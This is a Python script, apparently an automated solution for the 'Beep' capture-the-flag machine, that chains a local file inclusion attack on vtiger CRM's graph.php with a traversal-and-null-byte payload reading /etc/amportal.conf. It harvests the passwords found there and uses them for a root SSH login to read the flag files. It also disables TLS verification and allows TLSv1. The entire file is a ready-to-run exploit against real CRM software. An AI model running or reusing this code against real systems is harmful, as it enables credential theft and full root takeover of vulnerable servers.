import ssl
import argparse
import paramiko
import requests
import urllib3
from tc import TC

urllib3.disable_warnings()


class HTTPAdapter(requests.adapters.HTTPAdapter):
    """
    This class is needed to change the standard SSL behaviour of Requests.
    It won't except the 'unsafer' versions of SSL / TLS.
    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        ssl_context = ssl.create_default_context()
        ssl_context.minimum_version = ssl.TLSVersion.TLSv1
        ssl_context.check_hostname = False
        kwargs["ssl_context"] = ssl_context
        return super().init_poolmanager(*args, **kwargs)


def pwn_vtigercrm(ip_address) -> list:
    """
    Takes in the IP Address
    Performs an LFI attack to obtain Password of the root user
    The special bit is in regard to user an requests adapter.
    """
    URL = f"https://{ip_address}/vtigercrm/graph.php?current_language="
    PARAMETER = "../../../../../../../../etc/amportal.conf%00&module=Accounts&action"
    PASSWORDLIST = set()
    with requests.Session() as s:
        s.mount("https://", HTTPAdapter())
        try:
            res = s.get(url=URL+PARAMETER, verify=False)
            print(
                f"{TC.Text.GREEN}[*]{TC.RESET} LFI Attack Done on host: {TC.Text.YELLOW}{ip_address}{TC.RESET}")
            for line in res.text.split('\n'):
                if "PASS" in line and not "#" in line:
                    PASSWORDLIST.add(line.split("=")[1])
        except Exception as e:
            print(f"{TC.Text.RED}[*]{TC.RESET} Something went wrong: {e}")
    print(
        f"{TC.Text.GREEN}[*]{TC.RESET} {len(PASSWORDLIST)} unique passwords found: {TC.Text.YELLOW}{PASSWORDLIST}{TC.RESET}")
    return list(PASSWORDLIST)


def get_flags(ip_address, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname=ip_address, username=username, password=password)

    flag_location = {'user': '/home/fanis/user.txt', 'root': '/root/root.txt'}
    for key, value in flag_location.items():
        print(f"{TC.Text.GREEN}[*]{TC.RESET} Trying to get the {key} flag")
        _, stdout, stderr = client.exec_command(f"cat {value}")
        output = stdout.readlines() + stderr.readlines()
        if output:
            print(f"{TC.Text.GREEN}----Flag----{TC.RESET}")
            for line in output:
                print(
                    f"{TC.Text.GREEN}[>]{TC.RESET} {TC.Text.YELLOW}{line.strip()}{TC.RESET}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="Automate BEEP",
        description="Fire and Pown")
    required_arguments = parser.add_argument_group('Required Arguments')
    required_arguments.add_argument(
        "-H", "--host", help="The IP address of Beep", required=True)
    args = parser.parse_args()
    pw = pwn_vtigercrm(args.host)[0]
    get_flags(args.host, 'root', pw)
